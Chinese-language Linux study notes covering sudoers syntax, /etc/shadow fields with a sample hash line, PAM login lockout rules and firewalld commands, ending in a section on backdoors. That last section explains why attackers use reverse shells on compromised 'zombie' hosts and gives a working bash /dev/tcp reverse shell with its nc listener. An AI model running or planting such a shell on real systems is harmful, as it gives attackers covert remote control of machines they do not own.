### /etc/sudoer
    - root ALL=(ALL) ALL
        - 第一个ALL 允许哪个终端、机器访问 sudo
        - 第二个ALL 允许sudo以哪个用户的身份执行命令
        - 第三个ALL 允许用户以root身份执行什么命令
### /etc/shadow
    - garys:$1$2Uu6yiEE$m4Pj3bKxVd9oLA74jj4F0/:18364:0:99999:7:::
        - 第一列 用户名
        - 第二列 被加密过的密码；‘ * ’或者是‘ ! ’表示这个用户无法进行登录操作。
        - 第三列 密码最近变更的时间；1970年1月1日作为1，每过一天加1；
        - 第四列 重设密码后多少天内密码不可再次被更动
        - 第八列 账户哪一天失效
### PAM(Pluggable Authentication Modules)
- /etc/ssh/sshd_config 默认是开启状态“UsePAM yes”
- pam_tally2
```bash
# 禁止/etc/ssh/denyuser文件内的用户通过ssh登录
vim /etc/pam.d/sshd
auth required pam_listfile.so item=user sense=deny file=/etc/ssh/denyuser onerr=succeed
``
查看test用户登录的错误次数及详细信息
pam_tally2 --user test
清空test用户的错误登录次数，即手动解锁
pam_tally2 --user test --reset

# 通过tty登录的用户，输入密码错误超过三次则锁定1分钟，包含root用户且root用户锁定2分钟
vim  /etc/pam.d/login
auth required pam_tally2.so deny=3 unlock_time=60 even_deny_root root_unlock_time=120

vim /etc/pam.d/login
```

## iptables
### firewalld 被封装过的iptables
systemctl status firewalld.service

1. 查看防火墙规则
firewall-cmd --list-all 

2. 要想使配置的端口号生效,必须重新载入 
firewall-cmd --reload

3. 查询端口是否开放
firewall-cmd --query-port=8080/tcp
4. 开放80端口 和 移除端口
firewall-cmd --permanent --add-port=80/tcp
firewall-cmd --permanent --remove-port=8080/tcp
firewall-cmd --permanent --zone=public --add-port=80/tcp 
5. 端口转发：
firewall-cmd --permanent --add-forward-port=port=80:proto=tcp:toport=8080:toaddr=134.175.167.56


## 后门
- 参考  
https://xz.aliyun.com/t/2549  
### 反弹shell
1. 意义
    1. 局域网内肉鸡无法被连接。
    2. 肉鸡ip会动态改变，不能持续控制。
    3. 防火墙等限制，肉鸡只能发送请求，不能接收请求。
    4. 肉鸡网络环境未知，主动连接，省事。
2. 实现
```bash
# 我方服务器执行
nc -lvp 2333
# 肉鸡上执行
IP=127.0.0.1
bash -i >& /dev/tcp/${IP}/2333 0>&1
```